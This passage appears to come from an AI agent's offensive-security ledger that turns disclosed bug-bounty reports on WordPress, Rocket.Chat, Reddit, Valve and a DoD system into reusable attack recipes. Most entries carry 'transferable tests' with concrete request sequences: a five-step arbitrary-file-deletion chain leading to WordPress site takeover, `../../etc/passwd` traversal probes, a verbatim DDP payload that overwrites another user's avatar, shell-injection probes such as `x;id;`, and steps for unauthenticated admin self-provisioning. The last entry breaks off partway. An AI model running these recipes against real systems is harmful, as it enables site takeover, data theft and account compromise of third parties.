DETECTION SIGNAL: a media/attachment pipeline with a separate finalize/commit step whose JSON body carries filename fields (`sub_sizes[].file`, `sizes[*].file`, top-level `file`) accepted verbatim; a delete/cleanup path that derives BOTH the deletion target and its confinement base directory from that same metadata; a join helper that returns absolute/traversal paths unchanged (`path_join`); a low-privilege role that can both poison the metadata and trigger attachment deletion; the tell in code review is a containment check whose `real_directory` and `real_file` trace back to one attacker-controlled variable.
CHAIN: Author (can upload + edit own attachments) -> `finalize` writes attacker filenames verbatim into `_wp_attachment_metadata` (primitive) -> image-editor AJAX launders a poisoned `sizes[*]` entry into `_wp_attachment_backup_sizes` with a nonce printed to the Author (primitive) -> re-poison top-level `file` with a `../../` escape (primitive) -> Author deletes its own attachment -> the `$backup_sizes` branch deletes ANY file the PHP process can unlink, anywhere on disk (escalation) -> `wp-config.php` destroyed -> the unauthenticated installer runs -> full site takeover (impact: Critical 9.9; resolved, bounty hidden).
TRANSFERABLE TEST: on any WordPress with client-side media processing (any HTTPS site; an Author account suffices): (1) `POST /?rest_route=/wp/v2/media` a real JPEG (201, note `id`); (2) `POST /wp/v2/media/<id>/finalize` with `{"sub_sizes":[{"image_size":"thumbnail","file":"<victim-filename>","width":150,"height":150,"mime_type":"image/jpeg","filesize":1}]}`; (3) scrape the `imageEdit.open(<id>,"<nonce>")` nonce from `/wp-admin/media-upload.php?tab=library` and `POST /wp-admin/admin-ajax.php` with `action=image_editor&_ajax_nonce=<nonce>&postid=<id>&do=save&target=all&history=[{"r":90}]`; (4) re-finalize with `{"sub_sizes":[{"image_size":"original","file":"../../x.jpg",…}]}`; (5) `DELETE /wp/v2/media/<id>&force=true`; check whether the victim file is gone. General rule: **a containment check is only a check when its base directory comes from a trusted source — when the confine dir and the deletion target are both derived from attacker-controlled metadata, poison that metadata and the deletion goes anywhere on disk.**
DEDUPE/DELTA: 0 hits across all three write targets for `3931777`, `wp/v2/media`, `finalize` (as this endpoint), `_wp_attachment_backup_sizes`, `backup_sizes`, `finalize_item`, `wp_delete_attachment_files`, `client-side media processing` (the lone `jakubk` hit is a different WordPress report, #3893632). Related-but-distinct reviewed and NOT re-recorded: #960330 (DoD/Cisco ASA CVE-2020-3187 — arbitrary file deletion where the COOKIE VALUE is the filesystem path), the Rails ActiveStorage `key` traversal (~12135 — user-supplied blob key through `File.join(root, prefix, key)`, a write/read primitive with a trusted root), §17.36 / §17.435 (other traversal carriers). None records a SELF-REFERENTIAL delete guard (confine dir and target from the same attacker field). New general method -> §17.478.

SOURCE: https://hackerone.com/reports/3514640  2026-11-11
ROUTE: the live page returns only the program summary; the live `.json`, `r.jina.ai` and the Wayback snapshot (incl. the archived `.json` 20260803163233) all return `visibility: no-content` with a 0 B `vulnerability_information` (the ajaysenr mirror prints "No vulnerability information available"); the CREDITED PUBLIC WRITEUP route worked: NVD CVE-2026-56845 (CNA: HackerOne, published 2026-08-04) / GHSA-6c37-9jgq-mgm8 plus the affected-version list. Metadata: Rocket.Chat, "Unauthenticated Path Traversal (LFI) via /custom-sounds/ when CustomSounds uses FileSystem storage", weakness Path Traversal (CWE-22), High 7.5 (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N), reporter `howtoplay`, created 2026-01-17, disclosed 2026-08-03, Closed/Resolved, asset github.com/RocketChat/Rocket.Chat; affected < 7.10.8 / 7.11.5 / 7.12.5 / 7.13.4 / 8.0.2 / 8.1.1 / 8.2.0 (fixed in those).
STATUS: UNVERIFIED (not reproduced — no Rocket.Chat instance was stood up this pass; the method below is quoted from the CVE/GHSA record credited to this report).
CLASS: unauthenticated LFI / path traversal on a filesystem-backed custom-asset route (CWE-22).
CORE METHOD:
  1. PRECONDITION: Rocket.Chat's CustomSounds storage is configured to FileSystem (verbatim: "when CustomSounds storage is configured to FileSystem") — the traversal lives in the filesystem path join of the asset store.
  2. ENTRY POINT: the unauthenticated `/custom-sounds/` file-serving route (no credentials required; CVSS PR:N).
  3. BYPASS, verbatim (CVE-2026-56845): "By including ../ sequences in the request path, an attacker can read arbitrary files outside the base directory." The exact URL shape is NOT in the public record; the standard probe is a `../` (raw or `..%2f`, `..%5c`, double-encoded) sequence appended to the sounds path, e.g. `GET /custom-sounds/../../../../etc/passwd` and variants.
  4. IMPACT: arbitrary file read outside the sounds base directory as the Rocket.Chat process user — "configuration data, credentials, or other sensitive system files" (CVSS C:H/I:N/A:N).
DETECTION SIGNAL: a self-hosted Rocket.Chat (or any app with pluggable asset storage) where `GET /custom-sounds/` serves stored files unauthenticated; the storage setting for custom sounds/emojis/themes set to FileSystem; a `../`-style sequence in the asset request path that returns a file body from outside the asset base dir (e.g. `/etc/passwd` or app config content).
CHAIN: unauthenticated caller -> `../` in the `/custom-sounds/` request path, not normalized away (primitive: unauth path traversal on a filesystem-backed asset route) -> arbitrary file read outside the base directory (escalation) -> config/credential disclosure ("configuration data, credentials, or other sensitive system files") -> stolen DB/API credentials -> internal access (impact: the program rated High 7.5, confidentiality-only; the credential-read step is the chain's documented reach, further links are not in the public record).
TRANSFERABLE TEST: on any target with filesystem-backed custom-asset routes (custom sounds/emojis/themes/ringtones/avatars/attachments), send unauthenticated `GET <asset-route>/../../../../etc/passwd` plus `..%2f..%2f..%2f` and double-encoded variants; a file body outside the asset dir = unauth LFI. Also determine WHICH storage backend the feature uses (FileSystem vs GridFS/object storage) — the vulnerable join only exists on the filesystem backend, and the admin setting is the precondition. Rule: **a static asset route backed by a filesystem store is a filesystem join under attacker control — put `../` in the path and read anything the process user can read.**
DEDUPE/DELTA: 0 hits across all three write targets for `custom-sounds`, `custom_sounds`, `56845`, `GHSA-6c37-9jgq-mgm8`, `FileSystem storage`, `GridFS`. The ledger's LFI/path-traversal entries are other carriers (#960330 Cisco ASA WebVPN cookie-as-path, ActiveStorage `key` ~12135, §17.36/§17.435, §17.337 file-write); none records an UNAUTHENTICATED filesystem-backed custom-asset route nor the storage-backend precondition. No §17 slot (batch-165 precedent: a new carrier of an owned class gets no slot).

NOTE — reader pass 2026-11-11 (batch 167, numbered after the highest label in the file, 166 — 6 assigned sources read ONE BY ONE in the given order — 2 entries appended, 1 §17 slot). NEW: (1) #3931777 (WordPress — `POST /wp/v2/media/<id>/finalize` writes attacker filenames verbatim into `_wp_attachment_metadata`; the image-editor AJAX launders a poisoned `sizes[*]` entry into `_wp_attachment_backup_sizes` with a nonce printed to the Author; the `$backup_sizes` branch of `wp_delete_attachment_files()` derives BOTH the deletion target and its confinement dir from the poisoned `$meta['file']`, so `wp_delete_file_from_directory()`'s containment check always passes -> arbitrary file deletion anywhere on disk -> delete `wp-config.php` -> unauthenticated installer -> site takeover, Critical 9.9 -> §17.478); (2) #3514640 (Rocket.Chat — unauthenticated `../` path traversal in `/custom-sounds/` when CustomSounds storage is FileSystem -> arbitrary file read; researcher body 0 B everywhere — `visibility: no-content` on the live page, the `.json` route, `r.jina.ai`, the Wayback snapshot and the ajaysenr mirror — technique recovered from the credited public writeup = NVD CVE-2026-56845 / GHSA-6c37-9jgq-mgm8, CNA HackerOne; no §17 slot — the general path-traversal class is owned, this is a new carrier). VALID-BUT-NOT-APPENDED: #3445710 (Revive Adserver — `tracker-delete.php` "was not properly checking ownership of the `clientid` parameter before deleting the resource", so any user with tracker-delete rights deletes other accounts' trackers (CVE-2026-21641, High 7.1, fixed 6.0.5; H1 body 0 B, recovered from REVIVE-SA-2026-001 + the CNA record); a SIBLING INSTANCE of the recorded §17.339 — same Revive `*-delete.php` family, same `token`+`clientid` request shape, same "supply your own scoping id + a foreign child id" test, which §17.339's TRANSFERABLE TEST already covers; delta noted only so it is not re-derived), #2778441 (Nextcloud — publicly reachable `https://nextcloud.com/wp-content/debug.log` exposing server full directory paths; full body read; a P4 info/path disclosure with NO documented chain — doctrine §2(b) + the chain-only rule bar a standalone entry, and the `debug.log`/webroot-log primitive is already in the playbook's log enumeration), #1541740 (U.S. DoD — full body read: an authenticated user rewrites the sequential `SRBHeaderID=#######` in `/SelfService/esrbss/PDF/Index?SRBHeaderID=…&isBoard=…&OT=…` (OT 0=current / 2=validated / 5=certified) to pull any other soldier's ARB/ORB PDF (last-4 SSN, DOB, place of birth, clearance, mailing address, DoDID; ids demonstrably up to ~4,500,000); textbook sequential-integer IDOR on document-export endpoints — the class and its test are already owned (export-surface IDOR ~2598, sequential-id walking ~2411), so no new technique), #2735646 (Mozilla — `visibility: no-content`, 0 B researcher body in the live `.json`; the only public text is Mozilla's summary: an employee's API token for `sql.telemetry.mozilla.org` leaked in a GitHub repo commit gave access to the service dashboard containing confidential data; the GitHub-secret-hunting -> credential-replay method is already §9.5 + #761791). 0 fabricated. Knowledge intake only — no target was touched; every network call this pass was a read-only fetch of the 6 assigned HackerOne reports (live page via `web_extract`, the live `.json` route via curl, `r.jina.ai`, Wayback captures incl. the archived `.json`, the browser tool) plus NVD/GHSA/CNA records (CVE-2026-56845, CVE-2026-21641), the Revive vendor advisory REVIVE-SA-2026-001 and local dedupe greps against the three write targets. No hunt, no scan, no lab.

SOURCE: https://hackerone.com/reports/501084  2026-11-11
ROUTE: live `.json` -> HTTP 200, `visibility: full`, `vulnerability_information` 1,456 B read in full (the technique below is quoted from it; the live page via `web_extract` renders the same body). Metadata: Rocket.Chat, "Upload of Avatars for other Users", weakness Improper Access Control - Generic, severity Medium, reporter `gronke`, created 2019-02-25, disclosed 2024-08-10, Closed/Resolved, asset github.com/RocketChat/Rocket.Chat.
STATUS: UNVERIFIED (not reproduced — no Rocket.Chat instance was stood up this pass; the payload below is quoted verbatim from the report).
CLASS: BAC / horizontal IDOR on a WRITE action via a real-time RPC (Meteor DDP) method — `ufsImportURL` trusts a client-supplied `userId` in its params and writes a server-fetched image into THAT user's avatar store (CWE-639 / CWE-284).
CORE METHOD:
  1. ENTRY POINT, verbatim: "Attackers authenticated to the API trigger the `ufsImportURL` method with a different `userId` than their own, so that the other users avatar is changed." The sink is `packages/rocketchat-file-upload/server/lib/FileUpload.js#L210` (the report's own link, commit dc2005b76d8f4e315ebed6e06126102148672e0e).
  2. THE PAYLOAD, verbatim (report's "### Payload"):
     ```json
     ["{\"msg\":\"method\",\"method\":\"ufsImportURL\",\"params\":[\"https://radicallyopensecurity.com/images/ros-logo.gif\",{\"name\": \"ros.jpg\", \"extension\": \"jpg\", \"type\": \"text/plain\", \"userId\": \"<USER_ID>\"},\"Avatars\"],\"id\":\"15\"}"]
     ```
     — a Meteor DDP method-call frame; params = [URL to import, a file-metadata object carrying the TARGET `userId`, store name `"Avatars"`].
  3. THE MISSING CHECK: the handler never compares the `userId` param to the session user — any authenticated caller may name any user. Blast radius depends on the storage backend, verbatim: "the default one coming with a development release, GridFS, is affected."
  4. SIDE EFFECT: the method is an IMPORT — the server itself fetches the attacker-supplied URL (a server-side fetch primitive riding the same call) and stores the result in the named user's avatar store.
  5. REPRO, verbatim: "1. Authenticate to the API 2. Invoke `ufsImportURL` method pointing to other user 3. Clear browser caches and reload page". Suggested mitigation, verbatim: "Properly authenticate Avatar uploads".
DETECTION SIGNAL: a Meteor/DDP (or any RPC) surface whose import/upload/"set for user" methods take a file-metadata object with a `userId`/`owner`/`user_id` field that is passed straight into the store write; a store-selector param (`"Avatars"`, `"Uploads"`, `"Assets"`) naming a per-user namespace; the tell: the method authorizes the CALL (login) but not the SUBJECT (`userId`). Cross-check the REST twin of any such method — if the REST route scopes the subject server-side while the RPC method takes it from params, the RPC plane is the bypass.
CHAIN: any authenticated account (primitive: DDP login only) -> call `ufsImportURL` with a VICTIM `userId` and a URL the attacker controls (primitive: client-supplied subject id trusted; the server fetches the URL — server-side fetch as a bonus primitive) -> the fetched image is written into the victim's avatar store (escalation: an unauthenticated-to-the-victim WRITE into another user's account asset) -> cross-user avatar overwrite = profile defacement/impersonation of any user incl. admins (impact: horizontal write on any account; program rated Medium). Per doctrine §8: preconditions = any authenticated account + a target `userId`; gain = write to any user's avatar. The report documents avatar change ONLY — do not claim account takeover from this alone.
TRANSFERABLE TEST: on ANY app with RPC/real-time methods (Meteor DDP, Socket.IO, gRPC-Web, JSON-RPC, GraphQL subscriptions) exposing import/upload/"update for user" methods: (1) capture the method call; (2) rewrite any `userId`/`owner`/`user_id` param to a DIFFERENT user's id and re-send; (3) check the victim's profile for the change; (4) if the method takes a URL ("import from URL"), point it at your own host first to confirm the server-side fetch, then at the victim's namespace. Rule: **a method that takes the subject's id as a parameter and never compares it to the session is a cross-user write — the RPC plane is authorized at the connection level only.**
DEDUPE/DELTA: 0 hits across all three write targets for `501084`, `ufsImportURL`, `FileUpload.js`, `gronke`. Related-but-distinct, REVIEWED and NOT re-recorded: the ledger's Rocket.Chat DDP READ-side IDOR (harvest ledger ~9885 — `autoTranslate.translateMessage`, CVE-2026-32995: a client-supplied message object, no `Meteor.userId()`/room check, private-message disclosure) — same product and same DDP method plane, but a READ primitive with a different method and a different test. This entry is admitted for the WRITE carrier: a client-supplied `userId` on an IMPORT/UPLOAD method = write-into-foreign-store plus a server-side URL fetch. Carrier delta of the recorded DDP-method-plane class — no §17 slot.

SOURCE: https://hackerone.com/reports/2618486  2026-11-11
ROUTE: live `.json` -> HTTP 200, `visibility: full`, `vulnerability_information` 3,392 B read in full. Metadata: Reddit, "IDOR lets a malicious user reveal the unpinned achievement badges of any Reddit user", weakness Insecure Direct Object Reference (IDOR), severity Low, reporter `saurabhb`, created 2024-07-23, disclosed 2024-08-09, Closed/Resolved.
STATUS: UNVERIFIED (not reproduced — no requests were sent to Reddit this pass; every URL and the oracle wording below are quoted from the report).
CLASS: IDOR / authorization bypass on a SECONDARY RENDER SERVICE — the badge "hide" state (unpin) is enforced on the profile page but NOT on the share/embed preview renderer, which serves the badge image keyed by (username, sequential id) and answers "Not found" for badges the user does not have (CWE-639).
CORE METHOD (URLs verbatim from the report):
  1. THE VISIBILITY RULE (the product's own help page, cited in the report): unpinning a badge hides it from other users; the profile achievements page `https://www.reddit.com/user/<the-username-here>/achievements/` correctly hides it from a second account.
  2. THE SHADOW SURFACE: `https://share.redd.it/preview/user/<the-usename-here>/achievement/10?show-user-info=true` — the Share->Embed/preview service renders the badge image directly and does not re-check the hide/unpin state.
  3. THE ORACLE, verbatim: "a `Not Found` response means that that particular user does not have that badge and a `Valid Image` response means that that user has that particular badge."
  4. THE ENUMERATION: the badge id "is a simple 1-2 digit incremental number" — walk ids (9, 10, 11, ...) per username; only the public username is needed. Verbatim: "Using this technique we can enumerate the `Achievement Badges` of any arbitrary user of Reddit."
DETECTION SIGNAL: a user-facing PRIVACY/HIDE control (unpin, hide, archive, restrict, "only me") enforced on the main profile/API surface; a secondary service (share/embed/preview/badge/card/og-image/widget renderer) that takes (username, id) and serves the object's image or content directly; short/sequential ids on that renderer; an existence oracle (200-with-image vs 404/"Not found" vs placeholder). TELL: the primary page hides the object while the renderer answers 200 for the same object + viewer.
CHAIN: public username + sequential badge id (primitive: enumerable ids) -> the preview renderer ignores the hide state (primitive: the visibility filter lives only on the primary surface) -> the image-vs-"Not found" oracle enumerates EVERY badge incl. unpinned ones (escalation) -> behavioral inference about the victim, verbatim: "if the user joined more than a threshold number of communities, does this person have high (> 10%) upvote rating, does the person comment in same community in 20 days straight" — hidden-attribute disclosure the product explicitly promised to hide (impact: confidentiality of hidden profile attributes; program rated Low, PR:N). Per doctrine §8: preconditions = none (public endpoint, public username); gain = the full hidden-badge set of any user. Ceiling: limited cross-user data read (P3) — hold as chain material (hidden-attribute enumeration) if a richer renderer is found elsewhere.
TRANSFERABLE TEST: on any product with per-object privacy toggles AND a share/embed/preview/card renderer: (1) as user A, hide/unpin/restrict an object and verify with user B that the primary page hides it; (2) request the SAME object through the preview/renderer endpoint (`/preview/`, `/embed/`, `/badge/`, `/card/`, og-image endpoints) as user B; (3) if it renders, walk the object's id space (sequential ints first) and diff 200-with-content vs 404/placeholder to enumerate the hidden objects of ANY user. Rule: **a hide toggle enforced by the profile view but not by the share/preview renderer is a hidden-object oracle — renderers are a parallel authorization surface.**
DEDUPE/DELTA: 0 hits across all three write targets for `2618486`, `share.redd.it`, `unpin`, `achievements` (as a Reddit feature), `saurabhb`. Related-but-distinct, REVIEWED and NOT re-recorded: the parallel-surface class is owned in its GraphQL form (harvest ledger ~10987 — "a GraphQL field that returns an object the REST API hides for the same subject is an authorization bypass"); the visibility-state-as-oracle idea appears at ~5470 ("Any value that maps to a business/visibility state is an oracle even when no sensitive text is returned"); §17.364 covers missing visibility checks on WRITE-side moderation endpoints. NEW here: (a) the carrier is a share/EMBED RENDER SERVICE answering with an IMAGE, not an API; (b) the oracle is image-vs-"Not found" over SEQUENTIAL 1-2 digit ids; (c) the hidden state is a display-layer toggle (unpin) — the classic "the privacy setting is a UI filter" tell. Carrier delta of the parallel-surface/IDOR class — no §17 slot.

SOURCE: https://hackerone.com/reports/926169  2026-11-11
ROUTE: `visibility: no-content`, `vulnerability_information` 0 B — THE REPORT BODY IS WITHHELD. Readable public text = the TITLE + the program summary, read this pass from the live `.json` metadata, the Wayback capture 20260612091945 (meta description = the program summary: "Insufficient validation of parameters allowed injecting shell metacharacters into values used to construct a Bash command."), and the ajaysenr mirror (`https://github.com/ajaysenr/HackerOne-Disclosed-Reports/blob/main/reports/926169.md`, "No vulnerability information available"). Routes tried and failed, in order: `web_extract` on the live page (summary only); the BROWSER TOOL on the live URL ("Sorry, something went wrong"); `r.jina.ai/<url>` (HTTP 401 "blocked ... due to bad IP reputation"); Wayback HTML 20240803041224..20260612091945 and the CDX index (no archived `.json` exists). NOTHING below is invented — every fact is from the title and the program summary. Metadata: Valve, "Shell command injection in https://partner.steamgames.com/bundles/savestore/ via overwriting asset_path_identifier", weakness OS Command Injection, severity Critical (team summary: CVSS 9.6), reporter `njbooher3`, created 2020-07-17, disclosed 2024-07-30, Closed/Resolved, asset partner.steamgames.com.
STATUS: UNVERIFIED (not reproduced — and NOT REPRODUCIBLE from public material: no payload, no request shape and no response are public).
CLASS: OS command injection (CWE-78) via OVERWRITING a server-derived asset identifier field in a save request — the `asset_path_identifier` field of the `/bundles/savestore/` save flow carries shell metacharacters into a Bash command the partner backend constructs.
CORE METHOD:
  1. ENTRY POINT (from the title): `https://partner.steamgames.com/bundles/savestore/` — the Steamworks partner page that SAVES a bundle store.
  2. THE CARRIER (from the title): the request field `asset_path_identifier` — an asset-path identifier normally derived from stored asset metadata — can be OVERWRITTEN in the save request with attacker content.
  3. THE MECHANISM (program summary, verbatim): "Insufficient validation of parameters allowed injecting shell metacharacters into values used to construct a Bash command." — the overwritten value lands unencoded on a Bash command line.
  4. IMPACT: shell command injection on the partner backend; team-rated Critical (CVSS 9.6), weakness OS Command Injection.
DETECTION SIGNAL: a partner/vendor/admin save/update form where a PATH- or IDENTIFIER-bearing field (`*_path_*`, `*_identifier`, `asset_*`, `*_key`, `*_name`) is normally derived server-side but is accepted from the client on save (mass-assignment of a derived field); a backend step that shells out (asset packaging, publishing, transcoding, sync) after the save. TELL: the field "looks internal" — it names a path/identifier, not user content — so nobody fuzzes it; overwriting it is the attack.
CHAIN: an authenticated partner user (primitive: any partner account able to open the bundle save flow) -> overwrites `asset_path_identifier` with shell metacharacters (primitive: the derived field is client-writable) -> the save handler interpolates it into a Bash command (escalation: metacharacters on a command line) -> command execution on the partner backend (impact: RCE, Critical). Per doctrine §8: preconditions = partner-portal access with the bundles feature; gain = shell on the backend host. Not reproducible from public material.
TRANSFERABLE TEST: on ANY save/update/import flow that writes metadata or builds paths: (1) capture a legitimate save request and enumerate every field whose NAME suggests a derived value (`*_path*`, `*_identifier`, `asset_*`, `*_key`, `*_hash`, `*_name`, `source_*`); (2) overwrite each, one at a time, with `x;id;`, `x|id`, `x$(id)`, backtick-`id`-backtick, `x%0aid` and resubmit; (3) watch the response, the stored asset metadata and any OOB channel for command output; (4) the CONTROL is the same save with the field untouched — only the overwritten identifier changing behaviour proves it is the sink. Rule: **derived identifier/path fields are the least-tested writable fields on a save endpoint — the app trusts them because THEY name its own assets, and that is exactly why a Bash command line will trust them too.**
DEDUPE/DELTA: 0 hits across all three write targets for `926169`, `asset_path_identifier`, `savestore`, `bundles/savestore`. DELTA on the SAME reporter's recorded sibling #840243 (harvest ledger ~13517 — the FILE EXTENSION of the `item_image_small`/`item_image_large` upload fields on `/apps/communityitems/` reaches a publishing-gateway shell) and on the general "filename reaches a shell" family (#651518 `|`-prefixed filename -> `Rake::FileList#egrep`, git argument injection ~ledger 1806, GitLab `path` -> `Open3.popen3` ~ledger 2165). NEW in this entry: the carrier is a server-derived IDENTIFIER field inside a SAVE request (mass-assignment of `asset_path_identifier`), not a filename/extension on an upload — the sibling's transferable test enumerates "filename- or extension-bearing fields", this one enumerates "derived path/identifier fields on save". No §17 slot — the general method (a user-controlled name-ish value reaches a shell) is already recorded and the body is withheld (batch-150 #840243 precedent: withheld-body deltas are not promoted to playbook facts).

SOURCE: https://hackerone.com/reports/652649  2026-11-11
ROUTE: `visibility: no-content`, `vulnerability_information` 0 B — confirmed on the live `.json` AND on the Wayback-archived `.json` 20260405221513; THE REPORT BODY IS WITHHELD. Readable public text = the TITLE + the program summary, read this pass from the live `.json` metadata, the Wayback capture 20260405221507 (meta description = the program summary: "Context-specific commands to a web-facing gateway had insufficient parameter validation. Some economy queries could be run outside the actual requesters' capability by confusing the type system. Some bypasses for initial fixes were also provided."), and the ajaysenr mirror ("No vulnerability information available"). Routes tried and failed, in order: `web_extract` (summary only); BROWSER TOOL ("Sorry, something went wrong"); `r.jina.ai` (HTTP 401 bad-IP-reputation); Wayback HTML + archived `.json` (no-content). NOTHING below is invented — every fact is from the title and the program summary; NO parameter name, request shape or payload is public. Metadata: Valve, "WG call injection in /economy/contextcommand", weakness Command Injection - Generic, severity Critical (team summary: CVSS 9.6), reporter `njbooher3`, created 2019-07-22, disclosed 2024-07-30, Closed/Resolved, asset partner.steamgames.com.
STATUS: UNVERIFIED (not reproduced — no request shape, parameter name or payload is public; the mechanism below is the program summary's own wording).
CLASS: gateway CALL INJECTION + type-confusion authorization bypass — context-specific commands dispatched to a web-facing gateway (the "WG") have insufficiently validated parameters, so an attacker injects/steers gateway CALLS, and by confusing the type system runs economy queries OUTSIDE the requester's capability (CWE-20/CWE-77 for the call injection, CWE-843 for the type confusion).
CORE METHOD:
  1. ENTRY POINT (from the title): `https://partner.steamgames.com/economy/contextcommand` — a web endpoint dispatching CONTEXT-SPECIFIC COMMANDS to a web-facing gateway.
  2. THE MECHANISM, verbatim (program summary): "Context-specific commands to a web-facing gateway had insufficient parameter validation." — the parameters of the context command are the injection point; the title names the result "WG call injection" (the CALL that reaches the gateway is not the one the endpoint intended).
  3. THE ESCALATION, verbatim: "Some economy queries could be run outside the actual requesters' capability by confusing the type system." — a TYPE-confused parameter (a value of an unexpected shape) defeats the capability check, so queries execute with rights the requester does not hold.
  4. THE BYPASS LOOP, verbatim: "Some bypasses for initial fixes were also provided." — the first fix did not hold; the researcher re-tested and bypassed it.
  5. IMPACT: injected gateway calls + economy queries beyond the caller's capability; team-rated Critical (CVSS 9.6).
DETECTION SIGNAL: an RPC/gateway dispatch endpoint that takes a COMMAND NAME/VERB plus parameters and forwards a call to an internal gateway/service (fields like `command`, `context`, `action`, `method`, `op`, `cmd`, `call`); a per-context/per-role command whitelist enforced in one layer while the parameters pass through loosely typed; a capability/entitlement check that branches on a parameter's TYPE or shape. TELL: error text naming a gateway/serialization layer ("WG", marshaller, "context command"), and a handler that switches on a command field instead of being a fixed route.
CHAIN: a partner-authenticated caller (primitive: reach the context-command endpoint) -> smuggles an unintended gateway CALL through the insufficiently validated parameters (primitive: the dispatcher's whitelist covers the top-level command but not what the parameters invoke) -> confuses the type system so the capability check evaluates the wrong branch (escalation: economy queries execute outside the requester's capability) -> queries/actions beyond the caller's role on the economy gateway (impact: authorization bypass on economy data/actions; team Critical 9.6; the exact data reached is not public).
TRANSFERABLE TEST: on ANY gateway/RPC dispatch endpoint (command+params over one route): (1) map the accepted command set from UI calls, the JS bundle and error strings; (2) fuzz each PARAMETER for call smuggling — a second command name, a nested call envelope, an extra `method`/`call`/`op` field smuggled inside a parameter value — and watch whether an extra/foreign call executes; (3) re-send every parameter with a WRONG TYPE (object for a string, array for a number, operator-object where a scalar is expected) and diff the responses for queries outside your role; (4) RE-TEST after any fix — this report's initial fixes were bypassed. Rule: **a dispatcher that whitelists the top-level command but loosely types the parameters can be made to issue a DIFFERENT gateway call — and a capability check that branches on type is one confused type away from running as someone else.**
DEDUPE/DELTA: 0 hits across all three write targets for `652649`, `contextcommand`, `WG call`, `economy/contextcommand`. Type-confusion material REVIEWED and NOT re-recorded: §17.9 (scalar->array type confusion on a password-reset email param -> ATO), the RESP/Redis protocol type-confusion -> command injection entry (~ledger 2137), the mruby sandbox constant-lookup type confusion (~ledger 2414), and the batch dispatch-index desync -> parameter-type confusion note (~ledger 2068) — none is a GATEWAY CALL-INJECTION (smuggling an alternative call through a dispatcher's parameter validation) and none pairs it with a capability-check type confusion. The class (command injection) is owned, the evidence is summary-only and unreproducible, so NO §17 slot (batch-150 precedent: withheld-body deltas are not promoted to playbook facts). Freshness: the report is from 2019 — treat the carrier as historical; the transferable test is the live value.

NOTE — reader pass 2026-11-11 (batch 168, numbered after the highest label in the file, 167 — 6 assigned sources read ONE BY ONE in the given order — 4 entries appended, 0 §17 slots). NEW: (1) #501084 (Rocket.Chat — the Meteor DDP method `ufsImportURL` takes a client-supplied `userId` and writes a server-fetched image into THAT user's avatar store -> cross-user avatar overwrite + a server-side URL-import primitive; full 1,456 B body read live; carrier delta of the recorded DDP-method-plane IDOR at ~ledger 9885 (`autoTranslate.translateMessage`), no §17 slot); (2) #2618486 (Reddit — the badge "unpin = hidden" rule is enforced on `/user/<u>/achievements/` but not on the share/embed renderer `https://share.redd.it/preview/user/<u>/achievement/<1-2-digit-id>?show-user-info=true`, whose image-vs-"Not found" response is a boolean oracle over every badge incl. hidden ones; full 3,392 B body read live; carrier delta of the parallel-surface/IDOR class ~ledger 10987, no §17 slot); (3) #926169 (Valve — overwriting the derived `asset_path_identifier` field of the `/bundles/savestore/` save request carries shell metacharacters into a Bash command, Critical 9.6; body withheld everywhere, technique = the title + program summary only; delta of the recorded #840243 extension-carrier entry ~ledger 13517, no §17 slot); (4) #652649 (Valve — "WG call injection" in `/economy/contextcommand`: insufficient parameter validation on context-specific gateway commands lets an attacker steer the gateway CALL, and a type-confused parameter runs economy queries outside the requester's capability; "some bypasses for initial fixes were also provided"; body withheld everywhere incl. the Wayback-archived `.json`; summary-only, no §17 slot). VALID-BUT-NOT-APPENDED (exact duplicates): #2329547 (GitHub GHES — Management Console EDITOR -> root SSH via command injection in the collectd username/password config fields, CVE-2024-1369, High 7~8.9) and #2323292 (same family via the actions-console docker container while setting a service URL, CVE-2024-1355, High 7~8.9) — both report bodies are `visibility: no-content`, `vulnerability_information` 0 B (web_extract + browser tool + `r.jina.ai` 401 + Wayback captures all summary-only; the technique was confirmed this pass from the credited public record: GHSA-6r4c-h9mj-c94g / CVE-2024-1355, CVE-2024-1369 (Checkmarx DevHub/OpenCVE), and the GHES 3.8/3.9/3.10/3.11 release notes), and the technique AND BOTH NAMED SINKS are already recorded verbatim in §17.300 ("...collectd username/password, HTTP proxy, and the actions-console service URL (CVE-2024-1355). Each is a Management Console configuration field that reaches a template/config renderer.") and re-listed at §17.437 — the recorded entry's transferable test already covers exactly these fields, so nothing was re-appended. FRESHNESS NOTE: all 6 assigned sources were disclosed 2024-07..2024-08 (report dates 2019-2024), i.e. older than the 6-12 month preference; they were read because they were assigned, and every entry carries its report date so the age is visible. 0 fabricated. Knowledge intake only — no target was touched; every network call this pass was a read-only fetch of the 6 assigned HackerOne reports (live page via `web_extract`, live `.json` via curl, the browser tool, `r.jina.ai`, Wayback availability/CDX/HTML + archived `.json`, the ajaysenr mirror) plus the credited public records (GHSA-6r4c-h9mj-c94g, CVE-2024-1355, CVE-2024-1369, GHES release notes) and local dedupe greps against the three write targets. No hunt, no scan, no lab.
SOURCE: https://hackerone.com/reports/2354136  2026-11-11
ROUTE: full reporter body (1,432 B, `visibility: full`) read live this pass on the `.json` route (`curl` -> HTTP 200). Metadata: U.S. Dept Of Defense, "Attacker can Add itself as admin user and can also change privileges of Existing Users [█████████]", weakness Improper Authentication - Generic, severity Critical (author_type Team), reporter `dishant_singh`, created 2024-02-04, disclosed 2024-03-22, Closed/Resolved, no CVE.
STATUS: UNVERIFIED (not reproduced — no DoD system was touched this pass; every step, URL and word below is quoted from the report).
CLASS: authentication bypass / unauthenticated privileged USER-MANAGEMENT (admin self-provisioning + vertical privilege escalation) — a user-management directory found by directory brute-force has NO authentication, a numeric path/instance segment decides whether a login gate appears at all, and the app's own "Add New User" form provisions an ADMIN account whose username+password are emailed to the attacker (CWE-306 / CWE-269).
CORE METHOD (the reporter's own steps, quoted):
  1. DISCOVERY, verbatim: "After directory bruteforcing i found an directory without having any kind of protection and authentication."
  2. THE GATE FLIP, verbatim: "Visit ████████:1:0:::::  you will see the website is asking to login" / "Now change the **1 to 9** or directly visit this [url](██████████:::::)." — the numeric segment value decides whether the login prompt appears; the sibling value serves the function with no gate.
  3. THE PROVISIONING, verbatim: "Navigate to `Add New User`" / "enter email  address, First name, Last name and choose agency to Non-Agency." / "Click on `add new user`"
  4. THE DELIVERY, verbatim: "check mail inbox you will recieve the username and password for the admin account you just created." / "Login with the creds you just got in you email."
  5. THE SECOND PRIMITIVE, verbatim (title/intro): "an attacker can also change privilege of the users without any authentication." — the same unauthenticated surface edits EXISTING users' privileges.
